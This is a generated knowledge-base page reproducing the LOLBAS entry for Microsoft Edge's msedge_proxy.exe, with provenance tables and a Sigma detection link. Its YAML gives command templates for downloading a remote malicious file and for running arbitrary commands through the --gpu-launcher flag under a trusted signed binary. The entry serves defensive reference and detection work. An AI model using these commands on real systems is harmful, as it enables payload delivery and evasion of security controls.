---
parsed_by: focuslocust
source: lolbas
type: generated
---
# msedge_proxy.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `msedge-proxy.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/msedge_proxy.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [msedge_proxy.exe](../../tools/windows/msedge-proxy.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | msedge-proxy.exe |
| name | msedge_proxy.exe |
| type | tool |
| source | lolbas |
| url |  |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@merterpreter'
  Person: Mert Daş
Author: Mert Daş
Commands:
- Category: Download
  Command: C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe {REMOTEURL:.zip}
  Description: msedge_proxy will download malicious file.
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Usecase: Download file from the internet
- Category: Execute
  Command: C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher="{CMD}
    &&"
  Description: msedge_proxy.exe will execute file in the background
  MitreID: T1218.015
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: CMD
  Usecase: Executes a process under a trusted Microsoft signed binary
Created: 2023-08-18
Description: Microsoft Edge Browser
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_susp_electron_execution_proxy.yml
Full_Path:
- Path: C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe
Name: msedge_proxy.exe
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/msedge_proxy.yml
```

## Detection / Analysis Notes

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_susp_electron_execution_proxy.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/e1a713d264ac072bb76b5c4e5f41315a015d3f41/rules/windows/process_creation/proc_creation_win_susp_electron_execution_proxy.yml
```
